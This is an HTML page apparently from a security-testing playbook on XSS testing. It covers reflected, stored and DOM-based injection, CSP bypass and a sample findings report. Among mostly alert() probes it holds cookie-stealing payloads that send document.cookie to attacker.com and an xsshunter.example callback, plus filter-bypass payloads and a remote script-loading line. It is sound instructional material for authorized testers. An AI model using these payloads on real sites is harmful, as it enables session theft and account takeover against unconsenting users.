@@ -1,0 +1,266 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Playbook — Testing For Xss Vulnerabilities</title><style>:root{
+  /* surfaces */
+  --bg:#0a0c10; --bg-2:#0d1117; --surface:#12161d; --surface-2:#161b22; --card:#161b22;
+  --code:#0b0f14;
+  /* text */
+  --ink:#c9d1d9; --bright:#e6edf3; --muted:#7d8590; --faint:#54606e;
+  /* lines */
+  --border:#272d38; --border-soft:#1b212b;
+  /* brand: red primary + terminal-green secondary */
+  --red:#ff3b3b; --red-deep:#b3122a; --red-glow:rgba(255,59,59,.33);
+  --green:#39d353; --green-deep:#2ea043; --green-glow:rgba(57,211,83,.30);
+  /* quiet taxonomy accents */
+  --purple:#d2a8ff; --purple-line:#8957e5; --orange:#ffa657; --blue:#79c0ff;
+  --yellow:#e3b341; --link:#58a6ff;
+  /* severity (mirrors scanner/severity.py HTML_COLOR) */
+  --sev-critical:#ff2d55; --sev-high:#ff6b35; --sev-medium:#ffd700;
+  --sev-low:#34d399; --sev-info:#60a5fa;
+  /* convenience aliases used by the reference pages (Arsenal / Skills Library) */
+  --panel:#12161d; --accent:#d2a8ff; --star:#e3b341; --off:#ff7b72; --def:#56d364; --atk:#79c0ff;
+  /* type */
+  --sans:-apple-system,BlinkMacSystemFont,'Segoe UI',Inter,Roboto,Helvetica,Arial,sans-serif;
+  --mono:ui-monospace,'SF Mono',Consolas,'Liberation Mono','Courier New',monospace;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:var(--sans); color:var(--ink); background:var(--bg);
+  font-size:14px; line-height:1.6; -webkit-font-smoothing:antialiased;
+  background-image:
+    radial-gradient(1000px 460px at 50% -10%, rgba(179,18,42,.16) 0%, transparent 70%),
+    linear-gradient(rgba(255,255,255,.012) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,255,255,.012) 1px, transparent 1px);
+  background-size:auto, 44px 44px, 44px 44px;
+}
+/* unifying signature: a thin red→green bar across the very top of every page */
+body::before{content:"";position:fixed;top:0;left:0;right:0;height:2px;z-index:60;
+  background:linear-gradient(90deg,var(--red) 0%,var(--red-deep) 50%,var(--green) 100%);
+  box-shadow:0 0 12px var(--red-glow);}
+a{color:var(--link);text-decoration:none;} a:hover{text-decoration:underline;}
+code,kbd,samp{font-family:var(--mono);}
+::selection{background:var(--red-deep);color:#fff;}
+::-webkit-scrollbar{width:11px;height:11px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:#222a34;border-radius:6px;border:2px solid var(--bg);}
+::-webkit-scrollbar-thumb:hover{background:#303a47;}
+/* shared footer (class: hades-foot) */
+.hades-foot{text-align:center;padding:26px;color:var(--faint);font-size:.75rem;
+  border-top:1px solid var(--border-soft);margin-top:48px;}
+.hades-foot .prompt{color:var(--green);font-family:var(--mono);}
+
+.wrap{max-width:900px;margin:0 auto;padding:36px 22px 80px;}
+.pb-head{border-bottom:2px solid var(--red);padding-bottom:14px;margin-bottom:22px;}
+.pb-kicker{font-family:var(--mono);color:var(--purple);font-weight:700;letter-spacing:2px;font-size:.72rem;text-transform:uppercase;}
+h1.pb-title{margin:6px 0 8px;font-size:1.7rem;color:var(--bright);}
+.pb-desc{color:var(--muted);font-size:1rem;margin:0 0 12px;}
+.pb-tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px;}
+.pb-tag{font-family:var(--mono);font-size:.64rem;font-weight:700;letter-spacing:.5px;border:1px solid var(--purple-line);
+  color:var(--purple);background:#1a1430;border-radius:8px;padding:2px 8px;white-space:nowrap;}
+.pb-tag.atk{border-color:#1f6feb;color:var(--blue);background:var(--bg-2);}
+.content h1,.content h2,.content h3{color:var(--bright);margin-top:1.6em;border-bottom:1px solid var(--border);padding-bottom:.3em;}
+.content h2{font-size:1.3rem;} .content h3{font-size:1.08rem;border-bottom:none;}
+.content a{color:var(--link);} .content strong{color:var(--bright);}
+.content code{background:var(--code);color:var(--blue);padding:2px 6px;border-radius:5px;font-size:.86em;font-family:var(--mono);}
+.content pre{background:var(--code);border:1px solid var(--border);border-left:3px solid var(--green);border-radius:8px;
+  padding:14px 16px;overflow-x:auto;}
+.content pre code{background:none;color:var(--green);padding:0;}
+.content table{border-collapse:collapse;width:100%;margin:1em 0;}
+.content th,.content td{border:1px solid var(--border);padding:7px 11px;text-align:left;}
+.content th{background:var(--surface-2);color:var(--bright);}
+.content blockquote{border-left:3px solid var(--purple-line);margin:1em 0;padding:.4em 1em;color:var(--muted);background:var(--surface-2);}
+.content ul,.content ol{padding-left:1.4em;}
+.pb-foot{margin-top:48px;padding-top:16px;border-top:1px solid var(--border-soft);color:var(--faint);font-size:.8rem;}
+.pb-foot a{color:var(--purple);}
+</style></head>
+<body><div class="wrap">
+  <div class="pb-head">
+    <div class="pb-kicker">📘 Expert Playbook · Hades</div>
+    <h1 class="pb-title">Testing For Xss Vulnerabilities</h1>
+    <p class="pb-desc">Tests web applications for Cross-Site Scripting (XSS) vulnerabilities by injecting JavaScript payloads into reflected, stored, and DOM-based contexts to demonstrate client-side code execution, session hijacking, and user impersonation.</p>
+    <div class="pb-tags"><span class="pb-tag atk">T1595</span><span class="pb-tag atk">T1190</span><span class="pb-tag atk">T1059</span><span class="pb-tag atk">T1078</span><span class="pb-tag atk">T1055</span><span class="pb-tag">XSS</span><span class="pb-tag">cross-site-scripting</span><span class="pb-tag">client-side-security</span><span class="pb-tag">OWASP-A03</span><span class="pb-tag">JavaScript-injection</span></div>
+  </div>
+  <div class="content"><h1 id="testing-for-xss-vulnerabilities">Testing for XSS Vulnerabilities</h1>
+<h2 id="when-to-use">When to Use</h2>
+<ul>
+<li>Testing web applications for client-side injection vulnerabilities as part of OWASP WSTG testing</li>
+<li>Evaluating the effectiveness of input sanitization and output encoding across all application features</li>
+<li>Assessing the protection provided by Content Security Policy (CSP) headers against XSS exploitation</li>
+<li>Demonstrating the impact of XSS through session hijacking, credential theft, or phishing overlay to stakeholders</li>
+<li>Testing single-page applications (React, Angular, Vue) for DOM-based XSS in client-side routing and rendering</li>
+</ul>
+<p><strong>Do not use</strong> against applications without written authorization, for deploying persistent XSS payloads that affect real users, or for exfiltrating actual user session tokens from production environments.</p>
+<h2 id="prerequisites">Prerequisites</h2>
+<ul>
+<li>Authorized scope defining the target web application and acceptable testing activities</li>
+<li>Burp Suite Professional with XSS-focused extensions (XSS Validator, Reflector, Active Scan++)</li>
+<li>Browser with developer tools and XSS testing extensions (HackBar, XSS Hunter)</li>
+<li>XSS Hunter or Burp Collaborator for out-of-band payload verification</li>
+<li>SecLists XSS payload lists and custom payloads for WAF bypass scenarios</li>
+</ul>
+<blockquote>
+<p><strong>Legal Notice:</strong> This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.</p>
+</blockquote>
+<h2 id="workflow">Workflow</h2>
+<h3 id="step-1-input-and-output-mapping">Step 1: Input and Output Mapping</h3>
+<p>Map every location where user input enters and is rendered by the application:</p>
+<ul>
+<li><strong>Reflected inputs</strong>: Test every URL parameter, search field, error message, and HTTP header value that is reflected in the response</li>
+<li><strong>Stored inputs</strong>: Identify features where input is saved and displayed later: user profiles, comments, forum posts, file names, support tickets, and chat messages</li>
+<li><strong>DOM inputs</strong>: Identify client-side JavaScript that reads from <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>window.name</code>, <code>postMessage</code>, or <code>localStorage</code> and writes to the DOM</li>
+<li><strong>Output context identification</strong>: For each reflected input, determine the rendering context:</li>
+<li>HTML body: <code>&lt;div&gt;USER_INPUT&lt;/div&gt;</code></li>
+<li>HTML attribute: <code>&lt;input value="USER_INPUT"&gt;</code></li>
+<li>JavaScript string: <code>var x = 'USER_INPUT';</code></li>
+<li>URL context: <code>&lt;a href="USER_INPUT"&gt;</code></li>
+<li>CSS context: <code>&lt;div style="color: USER_INPUT"&gt;</code></li>
+</ul>
+<h3 id="step-2-reflected-xss-testing">Step 2: Reflected XSS Testing</h3>
+<p>Test reflected injection points with context-appropriate payloads:</p>
+<ul>
+<li><strong>HTML body context</strong>: <code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>, <code>&lt;img src=x onerror=alert(1)&gt;</code>, <code>&lt;svg onload=alert(1)&gt;</code></li>
+<li><strong>HTML attribute context</strong>: <code>" onfocus=alert(1) autofocus="</code>, <code>" onmouseover=alert(1) "</code>, <code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li><strong>JavaScript string context</strong>: <code>';alert(1)//</code>, <code>\';alert(1)//</code>, <code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li><strong>URL/href context</strong>: <code>javascript:alert(1)</code>, <code>data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li><strong>Inside HTML comments</strong>: <code>--&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--</code></li>
+<li><strong>Filter bypass payloads</strong> (when basic payloads are blocked):</li>
+<li>Case variation: <code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</code></li>
+<li>Event handlers: <code>&lt;details open ontoggle=alert(1)&gt;</code></li>
+<li>SVG: <code>&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x&gt;</code></li>
+<li>Encoding: <code>&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</code></li>
+</ul>
+<h3 id="step-3-stored-xss-testing">Step 3: Stored XSS Testing</h3>
+<p>Test persistent storage points that render input to other users:</p>
+<ul>
+<li>Submit XSS payloads to every stored input field identified in Step 1</li>
+<li>Use a unique identifier in each payload to track which inputs trigger: <code>&lt;script&gt;alert('XSS-PROFILE-001')&lt;/script&gt;</code></li>
+<li>Check all locations where the stored input is rendered (the same input may appear on multiple pages)</li>
+<li>Test file upload features with HTML files containing JavaScript, SVG files with embedded scripts, and filenames containing XSS payloads</li>
+<li>Test rich text editors by injecting payloads through the raw HTML mode or by manipulating the POST data after the client-side editor sanitizes</li>
+<li>Use XSS Hunter payloads (<code>"&gt;&lt;script src=https://yourxsshunter.xss.ht&gt;&lt;/script&gt;</code>) for blind stored XSS where the payload fires in an admin panel or internal tool you cannot directly access</li>
+</ul>
+<h3 id="step-4-dom-based-xss-testing">Step 4: DOM-Based XSS Testing</h3>
+<p>Analyze client-side JavaScript for unsafe DOM manipulation:</p>
+<ul>
+<li><strong>Source identification</strong>: Search JavaScript for dangerous sources that read attacker-controlled input:</li>
+<li><code>document.location</code>, <code>document.URL</code>, <code>document.referrer</code></li>
+<li><code>location.hash</code>, <code>location.search</code>, <code>location.href</code></li>
+<li><code>window.name</code>, <code>postMessage</code> event data</li>
+<li><strong>Sink identification</strong>: Search for dangerous sinks that write to the DOM:</li>
+<li><code>innerHTML</code>, <code>outerHTML</code>, <code>document.write()</code>, <code>document.writeln()</code></li>
+<li><code>eval()</code>, <code>setTimeout()</code>, <code>setInterval()</code>, <code>Function()</code></li>
+<li><code>element.setAttribute()</code> with event handlers, <code>jQuery.html()</code>, <code>.append()</code>, <code>v-html</code> (Vue), <code>dangerouslySetInnerHTML</code> (React)</li>
+<li><strong>Trace data flow</strong>: Follow the path from source to sink. If user-controlled input reaches a dangerous sink without proper sanitization, DOM XSS exists.</li>
+<li><strong>Framework-specific testing</strong>: Test React <code>dangerouslySetInnerHTML</code>, Angular template injection (<code>{{constructor.constructor('alert(1)')()}}</code>), Vue <code>v-html</code> directive</li>
+</ul>
+<h3 id="step-5-csp-bypass-and-advanced-exploitation">Step 5: CSP Bypass and Advanced Exploitation</h3>
+<p>Test Content Security Policy effectiveness and demonstrate real-world impact:</p>
+<ul>
+<li><strong>CSP analysis</strong>: Review the CSP header for weaknesses:</li>
+<li><code>unsafe-inline</code> in script-src allows inline scripts</li>
+<li><code>unsafe-eval</code> allows eval() and similar functions</li>
+<li>Wildcard domains (<code>*.googleapis.com</code>) may host JSONP endpoints usable for CSP bypass</li>
+<li><code>base-uri</code> not set allows <code>&lt;base&gt;</code> tag injection to redirect relative script loads</li>
+<li><strong>JSONP bypass</strong>: If CSP allows a domain with JSONP endpoints, use <code>&lt;script src="https://allowed-domain.com/jsonp?callback=alert(1)"&gt;&lt;/script&gt;</code></li>
+<li><strong>Impact demonstration</strong>:</li>
+<li>Session hijacking: <code>&lt;script&gt;new Image().src="https://attacker.com/steal?c="+document.cookie&lt;/script&gt;</code></li>
+<li>Credential phishing: Inject a fake login form overlay that submits to the attacker's server</li>
+<li>Keylogging: Inject JavaScript that captures keystrokes on the page</li>
+<li>Account takeover: Use XSS to change the victim's email address and trigger a password reset</li>
+</ul>
+<h2 id="key-concepts">Key Concepts</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Reflected XSS</strong></td>
+<td>Non-persistent XSS where the injected payload is included in the server's response to the same request, requiring the victim to click a crafted URL</td>
+</tr>
+<tr>
+<td><strong>Stored XSS</strong></td>
+<td>Persistent XSS where the payload is saved on the server and served to other users who view the affected page</td>
+</tr>
+<tr>
+<td><strong>DOM-Based XSS</strong></td>
+<td>XSS that occurs entirely in the browser when client-side JavaScript reads attacker-controlled data and writes it to a dangerous DOM sink</td>
+</tr>
+<tr>
+<td><strong>Content Security Policy</strong></td>
+<td>HTTP response header that restricts which sources the browser can load scripts, styles, and other resources from, providing defense-in-depth against XSS</td>
+</tr>
+<tr>
+<td><strong>Output Encoding</strong></td>
+<td>Converting special characters to their HTML entity equivalents (e.g., <code>&lt;</code> to <code>&amp;lt;</code>) to prevent the browser from interpreting user input as code</td>
+</tr>
+<tr>
+<td><strong>Sink</strong></td>
+<td>A JavaScript function or DOM property that can cause code execution or HTML rendering if attacker-controlled data reaches it unsanitized</td>
+</tr>
+</tbody>
+</table>
+<h2 id="tools-systems">Tools &amp; Systems</h2>
+<ul>
+<li><strong>Burp Suite Professional</strong>: HTTP proxy with active scanning for reflected and stored XSS, plus Repeater and Intruder for manual payload testing</li>
+<li><strong>XSS Hunter</strong>: Hosted service that generates payloads which phone home with screenshots, cookies, and DOM content when triggered, essential for blind stored XSS</li>
+<li><strong>DOMPurify</strong>: Client-side sanitization library used by developers to prevent XSS; testers should test for bypass techniques against the deployed version</li>
+<li><strong>Browser Developer Tools</strong>: Console, Network, and Elements tabs for tracing DOM-based XSS data flows and testing payloads in real-time</li>
+</ul>
+<h2 id="common-scenarios">Common Scenarios</h2>
+<h3 id="scenario-stored-xss-in-customer-support-ticket-system">Scenario: Stored XSS in Customer Support Ticket System</h3>
+<p><strong>Context</strong>: An e-commerce platform has a customer support system where customers submit tickets that are viewed by support agents in an internal admin panel. The ticket submission form accepts HTML formatting.</p>
+<p><strong>Approach</strong>:<br />
+1. Submit a support ticket with a unique XSS Hunter payload in the ticket description<br />
+2. The payload fires when a support agent views the ticket in the admin panel, sending a callback with the agent's session cookie, page DOM, and screenshot<br />
+3. Use the captured admin session cookie to access the admin panel as the support agent<br />
+4. From the admin panel, access customer records, order data, and refund functionality<br />
+5. Document the attack chain: customer submits ticket -&gt; agent views ticket -&gt; XSS fires -&gt; session stolen -&gt; admin panel compromised<br />
+6. Test if CSP would have prevented the attack (in this case, no CSP header was present)</p>
+<p><strong>Pitfalls</strong>:<br />
+- Only testing for <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> and missing XSS that fires through event handlers or in non-HTML contexts<br />
+- Not testing stored XSS in features that render to administrative users (support tickets, user profiles viewed by admins)<br />
+- Ignoring DOM-based XSS in single-page applications where the server-side code is secure but client-side rendering is vulnerable<br />
+- Not checking for XSS in HTTP headers (Referer, User-Agent) that may be logged and rendered in admin dashboards</p>
+<h2 id="output-format">Output Format</h2>
+<pre><code>## Finding: Stored XSS in Support Ticket Description
+
+**ID**: XSS-002
+**Severity**: High (CVSS 8.1)
+**Affected URL**: POST /api/tickets (submission), GET /admin/tickets/8847 (trigger)
+**Parameter**: description (POST body)
+**XSS Type**: Stored (persistent)
+
+**Description**:
+The support ticket description field does not sanitize HTML input before storing
+it in the database. When a support agent views the ticket in the admin panel, the
+unsanitized HTML is rendered in the agent's browser, allowing arbitrary JavaScript
+execution in the context of the admin application.
+
+**Proof of Concept**:
+Submitted ticket with payload:
+&lt;img src=x onerror=&quot;fetch('https://xsshunter.example/callback?c='+document.cookie)&quot;&gt;
+
+The payload fired when the agent viewed the ticket, exfiltrating the admin session
+cookie to the XSS Hunter server.
+
+**Impact**:
+An attacker can steal the session tokens of support agents and administrators,
+gaining access to the admin panel with privileges to view customer PII, process
+refunds, and modify orders. Affects all 23 support agents who view customer tickets.
+
+**Remediation**:
+1. Implement output encoding using a context-aware library (OWASP Java Encoder,
+   DOMPurify for client-side rendering)
+2. Deploy Content Security Policy header:
+   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
+3. Set HttpOnly flag on session cookies to prevent JavaScript access
+4. Sanitize HTML input server-side using a whitelist approach (allow only safe tags)
+</code></pre></div>
+  <div class="pb-foot">Rendered by Hades from the Anthropic-Cybersecurity-Skills library ·
+    for authorised security testing only.</div>
+</div></body></html>
